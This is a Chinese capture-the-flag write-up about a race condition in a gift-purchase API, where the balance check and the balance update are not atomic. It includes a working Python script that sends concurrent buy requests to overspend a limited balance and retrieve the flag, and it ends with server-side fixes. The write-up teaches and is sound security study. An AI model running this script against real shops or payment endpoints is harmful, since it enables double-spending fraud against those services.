# Liki的生日礼物

## 题目简述

登录后可以用余额购买礼物，礼物数量达到 52 时接口 `/API/?m=getflag` 返回 flag。购买接口把“检查余额”和“扣款/增加数量”分成了没有原子保护的步骤；同时发起多次购买请求，可以让多个请求在余额更新前都通过检查，从而用有限余额累计超过正常上限。

## 解题过程

先注册账号并登录，确认同一个会话可访问三个关键接口：

- `?m=buy`：以 `amount=1` 购买一份；
- `?m=getinfo`：返回余额 `money` 和数量 `num`；
- `?m=getflag`：当 `num >= 52` 时返回 flag。

下面的脚本复用登录 cookie，每轮并发发送 21 次购买请求，随后查询状态；目标地址和账号需要换成实际实例：

```python
import json
import time
from concurrent.futures import ThreadPoolExecutor

import requests

BASE_URL = "https://challenge.example/API/"
USER = {"name": "test", "password": "test"}

session = requests.Session()
session.post(f"{BASE_URL}?m=login", data=USER, timeout=10).raise_for_status()


def buy_once() -> None:
    response = session.post(
        f"{BASE_URL}?m=buy",
        data={"amount": "1"},
        timeout=10,
    )
    response.raise_for_status()


while True:
    info = session.get(f"{BASE_URL}?m=getinfo", timeout=10).json()["data"]
    print(f"money={info['money']} num={info['num']}")

    if int(info["num"]) >= 52:
        print(session.get(f"{BASE_URL}?m=getflag", timeout=10).text)
        break

    with ThreadPoolExecutor(max_workers=21) as executor:
        list(executor.map(lambda _: buy_once(), range(21)))
    time.sleep(1)
```

并发数并非固定答案；它要足以让多个请求落入相同的检查—更新窗口，又不能高到被连接数或限流机制大量丢弃。若一次没有越过阈值，继续分批发送并观察 `num` 变化即可。

## 方法总结

条件竞争的识别信号是“余额检查”和“状态更新”之间缺少数据库事务、行锁或原子更新。复现时应保持同一登录会话并真正并发发送请求，而不是在一个连接上顺序循环。服务端可通过带条件的原子更新、事务锁或唯一操作序号消除这类重复消费。
